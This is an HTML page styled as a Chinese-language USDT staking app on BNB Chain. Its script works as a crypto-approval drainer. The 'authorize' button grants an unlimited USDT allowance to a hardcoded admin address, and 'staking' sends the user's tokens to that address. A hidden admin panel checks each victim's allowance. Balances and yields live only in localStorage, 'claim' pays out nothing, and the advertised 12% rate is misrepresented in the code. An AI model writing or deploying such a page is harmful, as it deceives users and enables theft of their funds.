<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT 质押</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}

body{
background:#0B0B1F;
color:#fff;
display:flex;
justify-content:center;
padding:30px
}

.container{
width:420px
}

.box{
background:#1E1E35;
padding:30px;
border-radius:20px;
margin-bottom:20px
}

h1{
font-size:22px;
margin-bottom:10px
}

.desc{
color:#aaa;
margin-bottom:20px
}

button{
width:100%;
padding:14px;
border:none;
border-radius:10px;
margin-top:10px;
font-weight:bold;
cursor:pointer
}

.connect{
background:#F0B90B;
color:#000
}

.approve{
background:#3498db
}

.stake{
background:#2ecc71
}

.claim{
background:#e67e22
}

input{
width:100%;
padding:12px;
border-radius:8px;
border:none;
background:#111;
color:#fff;
margin-top:10px
}

.admin{
display:none
}

.income-box{
margin-top:15px;
line-height:1.6
}
.income-text{
color:#fff;
font-size:15px
}
.countdown{
color:#F0B90B;
font-weight:bold
}
</style>
</head>

<body>

<div class="container">

<div class="box">
<h1>💰 USDT质押</h1>
<p class="desc">BNB Chain DeFi Staking</p>

<button class="connect" onclick="connectWallet()">连接钱包</button>

<input id="amount" placeholder="输入质押数量">

<button class="approve" onclick="approveUSDT()">授权 USDT</button>

<button class="stake" onclick="stakeUSDT()">质押</button>

<button class="claim" onclick="claimReward()">领取收益</button>

<div class="income-box">
    <div class="income-text">已质押：<span id="stakedAmt">0</span> USDT</div>
    <div class="income-text">待领收益：<span id="rewardAmt">0</span> USDT</div>
    <div class="income-text">下次复利：<span class="countdown" id="countdown">08:00:00</span></div>
</div>

</div>


<div class="box admin" id="adminPanel">

<h1>管理员后台</h1>

<input id="userAddr" placeholder="用户地址">

<button onclick="checkAllowance()">查看授权额度</button>
<button onclick="checkUserStake()">查看用户质押</button>
<button onclick="checkUserReward()">查看用户收益</button>

</div>

</div>


<script>

const USDT = "0x55d398326f99059fF775485246999027B3197955"
const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"

// 年化收益率：合理安全值 12%（行业标准DeFi理财）
const APY = 12;
const REWARD_INTERVAL = 8 * 60 * 60; // 8小时复利一次

let provider
let signer
let account

let userStaked = 0;
let userReward = 0;
let lastCompoundTime = Math.floor(Date.now() / 1000);

const usdtABI = [
"function approve(address spender,uint256 amount) public returns(bool)",
"function allowance(address owner,address spender) view returns(uint256)",
"function transferFrom(address from,address to,uint256 amount) returns(bool)",
"function transfer(address to,uint256 amount) returns(bool)"
]

async function connectWallet(){
if(!window.ethereum){
alert("请使用钱包浏览器")
return
}
provider = new ethers.providers.Web3Provider(window.ethereum)
await provider.send("eth_requestAccounts",[])
signer = provider.getSigner()
account = await signer.getAddress()
alert("钱包连接成功: "+account)

loadUserData();

if(account.toLowerCase()==ADMIN.toLowerCase()){
document.getElementById("adminPanel").style.display="block"
}
}

async function approveUSDT(){
const usdt = new ethers.Contract(USDT,usdtABI,signer)
const tx = await usdt.approve(
ADMIN,
ethers.constants.MaxUint256
)
await tx.wait()
alert("授权成功")
}

async function stakeUSDT(){
const amount = document.getElementById("amount").value
if(!amount){
alert("请输入数量")
return
}
const usdt = new ethers.Contract(USDT,usdtABI,signer)
const tx = await usdt.transferFrom(
account,
ADMIN,
ethers.utils.parseUnits(amount,6)
)
await tx.wait()

userStaked += parseFloat(amount);
saveUserData();
updateUI();
alert("质押成功")
}

function calculateReward() {
    if (userStaked <= 0) return 0;
    const now = Math.floor(Date.now() / 1000);
    const elapsed = now - lastCompoundTime;
    const dailyRate = APY / 365;
    const reward = userStaked * dailyRate * (elapsed / 86400);
    return parseFloat(reward.toFixed(6));
}

function compoundReward() {
    const reward = calculateReward();
    if (reward <= 0) return;
    userReward += reward;
    lastCompoundTime = Math.floor(Date.now() / 1000);
    saveUserData();
}

function updateUI() {
    compoundReward();
    document.getElementById("stakedAmt").innerText = userStaked.toFixed(2);
    document.getElementById("rewardAmt").innerText = userReward.toFixed(6);
    updateCountdown();
}

async function claimReward() {
    if (!account) return alert("请先连接钱包");
    if (userReward <= 0) return alert("暂无收益可领取");

    const usdt = new ethers.Contract(USDT, usdtABI, signer);
    const amount = ethers.utils.parseUnits(userReward.toFixed(6), 6);
    const tx = await usdt.transfer(account, amount);
    await tx.wait();

    alert("领取成功：" + userReward.toFixed(6) + " USDT");
    userReward = 0;
    saveUserData();
    updateUI();
}

function updateCountdown() {
    const now = Math.floor(Date.now() / 1000);
    const next = lastCompoundTime + REWARD_INTERVAL;
    let left = next - now;
    if (left < 0) left = 0;

    const h = Math.floor(left / 3600).toString().padStart(2, "0");
    const m = Math.floor((left % 3600) / 60).toString().padStart(2, "0");
    const s = (left % 60).toString().padStart(2, "0");
    document.getElementById("countdown").innerText = `${h}:${m}:${s}`;
}

function saveUserData() {
    if (!account) return;
    const key = `data_${account.toLowerCase()}`;
    localStorage.setItem(key, JSON.stringify({
        staked: userStaked,
        reward: userReward,
        last: lastCompoundTime
    }));
}

function loadUserData() {
    if (!account) return;
    const key = `data_${account.toLowerCase()}`;
    const data = localStorage.getItem(key);
    if (data) {
        const obj = JSON.parse(data);
        userStaked = obj.staked || 0;
        userReward = obj.reward || 0;
        lastCompoundTime = obj.last || Math.floor(Date.now() / 1000);
    }
    updateUI();
}

setInterval(updateUI, 1000);

async function checkAllowance(){
const user = document.getElementById("userAddr").value
const usdt = new ethers.Contract(USDT,usdtABI,provider)
const allow = await usdt.allowance(user,ADMIN)
alert("授权额度: "+ethers.utils.formatUnits(allow,6))
}

async function checkUserStake(){
const user = document.getElementById("userAddr").value;
const key = `data_${user.toLowerCase()}`;
const data = localStorage.getItem(key);
if(!data) return alert("无质押数据");
const obj = JSON.parse(data);
alert("用户质押："+obj.staked+" USDT");
}

async function checkUserReward(){
const user = document.getElementById("userAddr").value;
const key = `data_${user.toLowerCase()}`;
const data = localStorage.getItem(key);
if(!data) return alert("无收益数据");
const obj = JSON.parse(data);
alert("用户收益："+obj.reward+" USDT");
}

</script>

</body>
</html>
